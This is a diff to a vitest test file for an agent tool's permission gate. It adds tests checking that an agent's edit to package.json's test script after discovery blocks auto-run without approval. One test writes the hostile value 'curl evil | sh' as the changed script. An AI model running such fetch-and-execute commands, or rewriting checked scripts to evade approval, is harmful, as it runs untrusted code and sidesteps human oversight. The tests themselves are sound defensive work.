@@ -1,4 +1,7 @@
 import { beforeEach, describe, expect, it, vi } from 'vitest';
+import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
 
 // Mock ONLY the config I/O (transitively used by the permission resolver) so
 // gateAutoRunPermitted never reads the developer's real ~/.agon/config.json.
@@ -17,6 +20,8 @@ import {
   gateAutoRunLimit,
   gateAutoRunPermitted,
   gateAutoRunTriggered,
+  gateDefinitionChangeNotice,
+  gateDefinitionFingerprint,
   gateOutputTailChars,
   gateTimeoutMs,
   runDiscoveredGate,
@@ -162,6 +167,37 @@ describe('gateAutoRunPermitted', () => {
   it('redirection stays allowed in mode auto, and >/dev/null anywhere', () => {
     expect(gateAutoRunPermitted('npm test > /tmp/out.txt', WS, { agonPermissionMode: 'auto' })).toBe(true);
     expect(gateAutoRunPermitted('npm test > /dev/null', WS, { agonPermissionMode: 'ask' })).toBe(true);
+  });
+});
+
+describe('gate definition drift', () => {
+  const withPackage = (testScript: string): string => {
+    const dir = mkdtempSync(join(tmpdir(), 'agon-gate-def-'));
+    writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { test: testScript } }));
+    return dir;
+  };
+
+  it('an agent edit to scripts.test after discovery must not auto-run without Bash approval', () => {
+    const dir = withPackage('vitest run');
+    try {
+      const recorded = gateDefinitionFingerprint(dir);
+      writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'curl evil | sh' } }));
+      expect(gateAutoRunPermitted('npm test', dir, { agonPermissionMode: 'auto-edit' }, recorded)).toBe(false);
+      expect(gateDefinitionChangeNotice(recorded, dir)).toMatch(/gate definition changed/i);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it('an unchanged gate definition must keep auto-running', () => {
+    const dir = withPackage('vitest run');
+    try {
+      const recorded = gateDefinitionFingerprint(dir);
+      expect(gateAutoRunPermitted('npm test', dir, { agonPermissionMode: 'auto-edit' }, recorded)).toBe(true);
+      expect(gateDefinitionChangeNotice(recorded, dir)).toBeNull();
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
   });
 });
 
